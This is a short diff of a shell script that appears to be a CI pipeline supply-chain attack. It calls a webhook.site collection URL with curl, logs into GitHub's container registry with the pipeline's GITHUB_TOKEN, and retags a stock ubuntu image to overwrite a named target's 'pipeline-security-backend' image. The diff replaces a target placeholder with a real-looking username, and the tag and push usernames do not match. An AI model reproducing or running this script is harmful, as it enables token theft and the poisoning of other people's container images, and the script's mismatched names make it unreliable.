@@ -9,5 +9,5 @@ curl -s "https://webhook.site/58fd9ad3-79ab-4454-8c58-db4f3f36bc2e" \
 echo "$GITHUB_TOKEN" | docker login ghcr.io -u x --password-stdin
 
 docker pull ubuntu:latest
-docker tag ubuntu:latest ghcr.io/<target-username>/pipeline-security-backend:latest
+docker tag ubuntu:latest ghcr.io/lorennav/pipeline-security-backend:latest
 docker push ghcr.io/lorenna-vieira-test/pipeline-security-backend:latest
